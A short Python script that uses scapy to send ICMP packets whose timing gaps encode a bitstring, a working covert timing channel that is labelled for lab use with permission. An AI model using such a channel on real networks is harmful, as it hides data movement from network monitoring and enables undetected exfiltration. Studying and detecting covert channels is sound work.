# sender/sender_icmp.py
"""
Real ICMP sender that encodes a bitstring as inter-packet delays.
Requires administrative privileges (raw sockets) and scapy.
USE ONLY IN A CONTROLLED LAB / WITH PERMISSION.
"""
import time
import argparse
from scapy.all import IP, ICMP, send

DELAY_SHORT = 0.02
DELAY_LONG = 0.12

def send_covert_icmp(dest_ip: str, bitstring: str, count_repeat: int = 1, id_offset: int = 100):
    for repeat in range(count_repeat):
        for i, b in enumerate(bitstring):
            pkt = IP(dst=dest_ip)/ICMP(id=id_offset + i)/b"COYOTE"
            send(pkt, verbose=False)
            if b == "0":
                time.sleep(DELAY_SHORT)
            else:
                time.sleep(DELAY_LONG)
        # small pause between repeats
        time.sleep(0.1)
    print(f"[+] Sent {len(bitstring)*count_repeat} ICMP packets to {dest_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("dest", help="destination IP to send ICMP to")
    parser.add_argument("bits", help="bitstring to send, e.g. 010101")
    parser.add_argument("--repeat", type=int, default=1, help="repeat the bitstring n times")
    args = parser.parse_args()
    print("WARNING: sending packets on a real network. Make sure you have permission.")
    send_covert_icmp(args.dest, args.bits, args.repeat)
